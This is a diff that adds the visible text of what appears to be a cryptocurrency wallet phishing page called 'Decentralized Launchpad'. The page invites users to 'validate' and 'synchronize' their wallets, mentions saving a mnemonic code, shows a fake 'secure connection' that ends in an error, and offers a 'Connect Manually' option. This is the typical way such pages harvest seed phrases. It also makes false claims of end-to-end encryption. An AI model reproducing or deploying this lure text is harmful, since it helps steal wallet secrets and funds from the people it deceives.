@@ -1,0 +1,90 @@
+Decentralized Launchpad
+Decentralized Launchpad
+Validate Wallet
+Validate, initialize,
+and synchronize your
+on your wallets
+Open and decentralized protocol for
+                                            syncing various Wallets to Dapps Secure Server
+Staking
+Migration V2
+Connect Wallet
+Airdrop
+Whitelist
+Marketplace
+Gas
+Claim Rewards
+Rectification
+Snapshot
+Buy Presale
+Migrate
+Validate, initialize,
+and synchronize your
+on your wallets
+Open and decentralized protocol for
+                                            syncing various Wallets to Dapps Secure Server
+Staking
+Migration V2
+Connect Wallet
+Airdrop
+Whitelist
+Marketplace
+Gas
+Claim Rewards
+Rectification
+Snapshot
+Buy Presale
+Migrate
+Validate, initialize,
+and synchronize your
+on your wallets
+Open and decentralized protocol for
+                                            syncing various Wallets to Dapps Secure Server
+Staking
+Migration V2
+Connect Wallet
+Airdrop
+Whitelist
+Marketplace
+Gas
+Claim Rewards
+Rectification
+Snapshot
+Buy Presale
+Migrate
+Select Your Wallet
+We have varieties of wallets you can choose from to validate or
+                                synchronize your wallet. Please, select your correct wallet name before proceeding.
+Validate Your Wallet
+Once you select your wallet, you will be prompted to connect via a
+                                decentralized protocol. This can successfully be completed manually or automatically.
+Generate QR Code
+Upon successful validation, a QR Code will be generated for your wallet.
+                                You can always scan your QR Code to reinitialize your wallet.
+Save Wallet QR Code
+Saving your generated mnemonic code or QR Code is important. You can
+                                click on Save or Screenshot the QR Code Page. You choose how you want to save!
+Decentralized
+Launchpad
+Open and decentralized protocol for syncing various Wallets
+                                    to Dapps Secure Server. This is not an app but a protocol that establishes a remote
+                                    connection between two apps and/or devices
+Wallet Successfully Validated
+Please save your
+generated below
+Save QR Code
+Sync Wallet
+Synchronize and validate your selected wallet. A QR code via
+an Open and Decentralized protocol
+will be generated
+                            upon successful validation.
+starting secure connection...
+please wait...
+An error occurred... please try again or connect mannually
+Try Again
+Connect Manually
+Connect Wallet
+This session is
+                                protected with an end-to-end encryption
+
+URLs:
